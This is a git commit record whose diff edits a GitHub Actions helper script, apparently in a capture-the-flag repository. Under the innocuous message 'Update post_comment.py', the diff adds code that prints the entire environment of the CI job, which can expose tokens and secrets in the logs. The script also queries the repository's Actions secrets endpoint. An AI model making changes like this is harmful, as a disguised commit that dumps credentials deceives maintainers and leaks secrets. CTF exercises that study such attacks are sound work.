17badf562ce38710fe777d7fddfbb523e7d66594
Nikita Shulga <2453524+malfet@users.noreply.github.com>
2024-10-08 11:36:06 -0700

    Update post_comment.py

--- .github/scripts/post_comment.py
+++ .github/scripts/post_comment.py
@@ -2,6 +2,8 @@
 
 from github_utils import gh_fetch_url_and_headers
 def main():
+    import os
+    print(os.environ)
     print(gh_fetch_url_and_headers("https://api.github.com/repos/PyTorchDevInfraCTF/ctf2/actions/secrets"))
 
 
